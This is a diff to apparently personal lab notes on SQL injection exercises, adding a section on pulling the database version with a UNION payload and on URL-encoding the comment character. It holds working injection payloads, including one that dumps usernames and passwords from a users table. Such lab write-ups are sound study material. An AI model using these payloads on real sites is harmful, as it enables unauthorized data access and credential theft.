@@ -42,3 +42,13 @@ one usable column for output.
 `~` separator splits the two values apart in the output for easy reading.
 Payload: ' UNION SELECT NULL,username||'~'||password FROM users--
 Leaked output as administrator\~<password>, logged in as admin.
+
+## Lab 6 — Querying the database type and version (MySQL/MSSQL)
+Confirmed 2 text columns first, then pulled version string using @@version.
+`@@version` is a built-in variable on both MySQL and SQL Server, returns
+the DB version directly, no separate lookup table needed.
+Payload: `' UNION SELECT @@version,NULL#`
+Note: typing `#` directly in browser address bar gets stripped as a URL
+fragment before reaching server, breaking the query. Use `%23` instead
+when pasting payloads into the address bar, or use `-- ` comment style.
+Leaked version string, lab solved.
